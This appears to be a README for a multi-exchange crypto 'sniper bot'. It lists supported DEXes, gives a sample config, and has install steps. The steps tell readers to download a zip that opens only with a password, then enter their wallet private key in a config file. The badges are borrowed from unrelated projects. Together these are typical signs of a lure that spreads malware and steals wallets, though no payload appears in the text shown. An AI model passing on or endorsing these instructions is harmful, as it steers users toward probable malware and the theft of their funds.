# Dex-sniper-bot

<p align="center">
  <a href="https://www.npmjs.com/package/hashlips_art_engine">
    <img alt="downloads" src="https://img.shields.io/npm/dm/hashlips_art_engine.svg?color=blue" target="_blank" />
  </a>
  <a href="https://github.com/kefranabg/readme-md-generator/blob/master/LICENSE">
    <img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-yellow.svg" target="_blank" />
  </a>
  <a href="https://codecov.io/gh/kefranabg/readme-md-generator">
    <img src="https://codecov.io/gh/kefranabg/readme-md-generator/branch/master/graph/badge.svg" />
  </a>
  <a href="https://github.com/frinyvonnick/gitmoji-changelog">
    <img src="https://img.shields.io/badge/changelog-gitmoji-brightgreen.svg" alt="gitmoji-changelog">
  </a>
</p>

A sniper bot is a type of automated trading bot that is programmed to make trades based on specific market conditions in the cryptocurrency industry. The name "sniper" comes from the bot's ability to make fast and precise trades, entering and exiting positions quickly.

To identify profitable trades, sniper bots use technical analysis and various indicators, such as price changes, trading volume, and market trends. Once the bot detects a favorable trade, it will automatically execute a buy or sell order based on specific parameters, such as target prices or stop-loss limits.

# Sniper bot for multiple decentralized exchanges (DEX)

![Mempool sniper bot interface](https://github.com/deadspyexx/Mempool-sniper-bot/blob/main/menu_screen.png?raw=true)

* Pancakeswap (Binance Smart Chain (BSC))
* PYEswap (Binance Smart Chain (BSC))
* Uniswap (Ethereum (ETH))
* Sushiswap (Polygon (MATIC))
* Quickswap (Polygon (MATIC))
* Trader Joe (Avalanche (AVAX))
* Pangolin (Avalanche (AVAX))
* Spookyswap (Fantom(FTM))
* Mad Meerkat (Cronos(CRO))
* Sushiswap (Harmony(ONE))
* Foxswap (Harony(ONE))
* Milkyswap (Milkomeda(MilkADA))

## Installing
- [Download](https://github.com/deadspyexx/Mempool-sniper-bot/archive/refs/heads/main.zip) repository and extract files with password `whLn1sTWT`.
- Edit the address and private_key fields in the config.json file. 
- Set up the network and AMMs in the sniping menu. Ensure that there are sufficient funds on the specified address to cover transaction fees.

## Snipe with multiple currency tokens

* BNB, BUSD, USDT, ETH, USDT, USDC, MATIC, AVAX, FTM, PYE, ONE, MilkADA, CRO.

### Configuration

```ini
[WALLET]
; This is your BSC wallet's private key.
SECRET_KEY=private_wallet_key

; A private node is recommended for better uptime. However, you may also use free nodes.
WSS_NODE=wss://bsc-ws-node.nariox.org:443


[CONTRACTS]
; These variables support some pre-defined contracts (BNB, ETH, BUSD). 
; For other contracts, you'll have to specify the contract address yourself.
INPUT=BNB
OUTPUT=BUSD


[TRANSACTION]

GAS_LIMIT=500000
GAS_PRICE=5

; This variable is the amount of cryptocurrency you wish to use with the input contract.
; For example, if you use WBNB as input, you will specify the amount in WBNB's format.
AMOUNT_IN=0.0033

BUY_SLIPPAGE=10
```

